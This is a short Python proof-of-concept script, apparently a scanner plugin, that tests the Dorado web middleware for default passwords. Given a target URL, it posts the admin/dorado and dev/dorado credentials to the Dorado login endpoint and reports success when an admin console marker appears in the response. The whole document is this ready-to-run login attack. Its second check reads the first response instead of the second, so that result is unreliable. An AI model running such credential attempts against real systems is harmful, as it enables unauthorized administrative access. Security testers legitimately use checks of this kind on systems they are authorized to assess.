#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dorado默认口令漏洞
referer: unknown
author: Lucifer
description: dorado是一款web中间件，具有AJAX特征的web应用表现层的快速开发框架,存在默认口令dev/dorado,admin/dorado。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class dorado_default_passwd_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/x-www-form-urlencoded",
        }
        payload = "/dorado/access.login.d"
        post_data = {
            "user":"admin",
            "password":"dorado"
        }
        post_data2 = {
            "user":"dev",
            "password":"dorado"
        }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"console.showSystemInfo.d" in req.text:
                cprint("[+]存在dorado默认口令漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
            req2 = requests.post(vulnurl, data=post_data2, headers=headers, timeout=10, verify=False)
            if r"console.showSystemInfo.d" in req.text:
                cprint("[+]存在dorado默认口令漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data2, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dorado_default_passwd_BaseVerify(sys.argv[1])
    testVuln.run()
